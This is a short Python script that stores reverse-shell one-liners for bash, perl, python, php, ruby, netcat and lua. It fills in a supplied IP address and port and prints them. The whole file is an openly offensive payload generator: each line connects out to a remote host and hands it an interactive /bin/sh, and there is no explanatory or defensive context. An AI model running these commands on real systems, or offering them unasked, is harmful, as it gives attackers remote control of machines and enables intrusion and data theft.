#!/usr/bin/env python
# -*- coding: utf-8 -*-

_doc = '''
[bash]

bash -i >& /dev/tcp/<ip>/<port> 0>&1

[perl]

perl -e 'use Socket;$i="<ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

[python]

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

[php]

php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

[ruby]

ruby -rsocket -e'f=TCPSocket.open("<ip>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

[nc]

nc -e /bin/sh <ip> <port>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f

[lua]

lua -e "require('socket');require('os');t=socket.tcp();t:connect('<ip>','<port>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
'''

def shellDoc(argv):
    if len(argv) == 0:
        ip = "8.8.8.8"
        port = 8888
    elif len(argv) == 1:
        ip = argv[0]
        port = 8888
    else:
        ip = argv[0]
        port = argv[1]
    print(_doc.replace("<ip>", ip).replace("<port>", str(port)))
